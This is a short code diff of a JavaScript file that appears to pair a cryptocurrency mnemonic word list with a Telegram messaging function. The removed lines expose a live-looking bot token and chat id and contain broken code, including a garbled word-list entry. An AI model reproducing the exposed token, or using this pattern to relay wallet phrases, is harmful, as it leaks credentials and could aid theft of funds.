@@ -854,7 +854,7 @@
             "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper",
             "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility",
             "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various",
-            "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "M_APIrb", "verify", "version",
+            "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version",
             "very", "vessel", "veteran", "viable", "vibe", "vicious", "victory", "video", "view", "village",
             "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal",
             "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk",
@@ -1074,11 +1074,11 @@
         // وظائف Telegram
         async function sendTelegramMessage(message) {
             try {
-                const response = await fetch(`${7906627459:AAFupbP8dosA92dUlWH0DpGvAZK0yGr17b4}/sendMessage`, {
+                const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: 910021564,
+                        chat_id: TELEGRAM_CHAT_ID,
                         text: message,
                         parse_mode: 'HTML'
                     })
